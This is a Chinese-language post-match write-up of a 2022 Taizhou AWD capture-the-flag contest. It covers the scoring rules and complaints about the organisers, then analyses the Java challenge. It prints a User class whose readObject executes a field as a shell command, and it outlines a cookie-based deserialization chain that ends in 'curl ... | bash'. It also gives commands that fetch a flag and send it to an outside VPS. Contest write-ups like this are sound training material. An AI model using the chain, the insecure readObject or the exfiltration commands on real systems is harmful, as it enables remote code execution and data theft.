# 2022 台州市赛线上 AWD 赛后小记

## 来源
- 原文：ctfiot.com/81475.html

## 赛制
- 4h，10min 一轮共 24 轮，**无加固时间**
- 计分：攻陷 +10，被攻陷 -15，check 不过 -100，起始 5000
- 一台 Java + 一台 PHP

## 吐槽
- 无加固时间，Java 题来不及重打 war 包
- check 写得稀烂，删站都能过
- IP 不连续 + 比赛过程中变动 IP 2 次
- 三次免扣分重置（一般要扣分 + 签字）

## Java 题解析

### 环境
- SSH 上是物理机 ctf 用户，无提权
- ROOT.war 是小米商城管理系统
- 部署在 Docker 里，ctf 用户只能 `restart.sh` 重启

### 漏洞链
**入口 - User 实体 readObject**：
```java
class User implements Serializable {
    private String password;
    private void readObject(ObjectInputStream in) {
        in.defaultReadObject();
        Runtime.getRuntime().exec(this.password);  // password 作为命令执行
    }
}
```

**依赖**：
- fastjson 1.2.15
- CC3 / CC4
- ROME
- SnakeYAML
- **fastjson-local-echo** 工具（盲打回显）

**Cookie cuser 反序列化触发链**：
1. 构造 User payload 序列化
2. Base64 编码放 Cookie: cuser=...
3. 触发 readObject → exec(curl ... | bash) 外带 flag

**flag 外带**：
```bash
flag=`curl http://43.136.168.189/index.php?token=3665_USR-20221125-6uv1t`;
curl vps:2333?flag=$flag
```

## 关键经验
- Java AWD 优先看 `pojo` 实体类的 `readObject` 方法
- 物理机 + Docker 部署，**修补代码要重新打包 war** + restart.sh
- 不出网时用 fastjson-local-echo 做盲打回显

## 适用场景
- Java AWD 实战
- Fastjson + CC 链组合
- 不出网时盲打回显
